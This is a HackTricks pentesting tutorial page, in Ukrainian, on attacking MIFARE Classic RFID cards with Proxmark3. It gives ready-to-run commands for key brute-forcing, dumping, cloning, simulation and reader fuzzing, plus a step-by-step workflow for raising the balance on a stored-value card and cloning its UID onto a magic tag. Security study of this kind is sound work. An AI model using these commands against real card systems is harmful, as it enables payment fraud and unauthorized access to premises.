# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Атака на RFID-системи за допомогою Proxmark3

Перш за все вам потрібно мати [**Proxmark3**](https://proxmark.com) та [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Атака на MIFARE Classic 1KB

Він має **16 секторів**, кожен з яких має **4 блоки**, і кожен блок містить **16B**. UID знаходиться в секторі 0 блоці 0 (і не може бути змінений).\
Щоб отримати доступ до кожного сектора, вам потрібні **2 ключі** (**A** та **B**), які зберігаються в **блоці 3 кожного сектора** (sector trailer). Сектор-трейлер також зберігає **біти доступу**, які задають права на **читання та запис** для **кожного блоку** з використанням двох ключів.\
Наявність двох ключів корисна, наприклад, для того, щоб надати право на читання, якщо ви знаєте перший ключ, і право на запис, якщо ви знаєте другий.

Можна виконати кілька атак
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3 дозволяє виконувати інші дії, такі як **eavesdropping** a **Tag to Reader communication**, щоб спробувати знайти конфіденційні дані.

На цій карті ви можете просто перехопити комунікацію та обчислити використаний ключ, оскільки **використані криптографічні операції є слабкими**, і, знаючи відкритий та зашифрований текст, ви можете його розрахувати (`mfkey64` tool).

#### MiFare Classic — швидкий робочий процес для зловживання картами зі збереженим балансом

Коли термінали зберігають баланси на Classic-картках, типовий потік від початку до кінця виглядає так:
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
Примітки

- `hf mf autopwn` координує атаки в стилі nested/darkside/HardNested, відновлює ключі та створює dumps у папці client dumps.
- Запис block 0/UID працює лише на magic gen1a/gen2 картках. Звичайні Classic картки мають UID тільки для читання.
- Багато розгортань використовують Classic "value blocks" або прості checksums. Переконайтеся, що всі дубльовані/доповнені поля та checksums узгоджені після редагування.

See a higher-level methodology and mitigations in:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Commands

Системи IoT іноді використовують **небрендовані або некомерційні теги**. У такому випадку ви можете використовувати Proxmark3 для відправлення користувацьких **raw commands to the tags**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
З цією інформацією ви можете спробувати знайти відомості про картку та про спосіб з нею спілкування. Proxmark3 дозволяє відправляти raw-команди, наприклад: `hf 14a raw -p -b 7 26`

### Scripts

Програмне забезпечення Proxmark3 містить попередньо завантажений список **automation scripts**, які можна використовувати для виконання простих завдань. Щоб отримати повний список, використайте команду `script list`. Далі використайте команду `script run`, після якої вкажіть назву скрипта:
```
proxmark3> script run mfkeys
```
Ви можете створити скрипт для **fuzz tag readers**: скопіювавши дані **valid card**, просто напишіть **Lua script**, який **randomize** один або кілька випадкових **bytes** і перевіряє, чи **reader crashes** в будь-якій ітерації.

## References

- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
